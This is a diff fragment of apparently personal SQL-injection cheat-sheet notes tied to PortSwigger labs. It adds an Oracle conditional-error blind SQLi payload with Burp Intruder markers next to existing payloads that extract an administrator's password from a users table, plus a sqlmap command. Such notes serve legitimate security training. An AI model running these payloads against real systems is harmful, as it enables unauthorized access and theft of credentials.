@@ -1157,7 +1157,8 @@ TrackingId=xyz' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='a
 
 TrackingId =u5YD3PapBcR4lN3e7Tj4' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm #This query checks to narrow the first letter of the 'Admin' password
 
-
+# Blind Oracle sqli (https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+ TrackingId=Vqg7K1mFWH8hNMMb'||(SELECT+CASE+WHEN+SUBSTR(password,§1§,1)='§a§'+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users+WHERE+username%3d+'administrator')||'  # Used Burp Cluster bomb to iterate through the length of the password and simplelist.
 
 # Post
 ./sqlmap.py -r search-test.txt -p tfUPass  #<-p> is the parameter to test in the file
